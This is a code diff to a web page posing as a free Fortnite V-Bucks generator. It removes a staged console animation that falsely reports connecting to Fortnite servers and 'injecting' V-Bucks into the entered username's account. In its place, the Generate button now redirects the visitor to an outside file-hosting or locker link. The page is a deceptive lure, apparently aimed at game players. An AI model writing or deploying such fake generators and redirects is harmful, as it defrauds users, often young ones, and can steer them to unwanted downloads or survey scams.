@@ -126,29 +126,12 @@
 
         generateButton.addEventListener('click', () => {
             const username = usernameInput.value.trim();
-            const quantity = vbucksQuantitySelect.value;
 
             if (username === '') {
                 logToConsole('ERROR: Please enter your Fortnite username.');
                 return;
             }
-
-            logToConsole(`Initiating V-Bucks generation for user: ${username}`);
-            logToConsole(`Requested quantity: ${quantity} V-Bucks`);
-            logToConsole('Connecting to Fortnite servers...');
-
-            // Simulate network delay and processing
-            setTimeout(() => {
-                logToConsole('Connection established. Authenticating...');
-                setTimeout(() => {
-                    logToConsole('Authentication successful. Injecting V-Bucks...');
-                    setTimeout(() => {
-                        logToConsole(`Successfully injected ${quantity} V-Bucks to ${username}'s account.`);
-                        logToConsole('Please allow a few minutes for the V-Bucks to appear in your account.');
-                        logToConsole('GENERATION COMPLETE!');
-                    }, 3000);
-                }, 2000);
-            }, 1500);
+            window.location.href = 'https://singingfiles.com/1830178';
         });
     </script>
 </body>
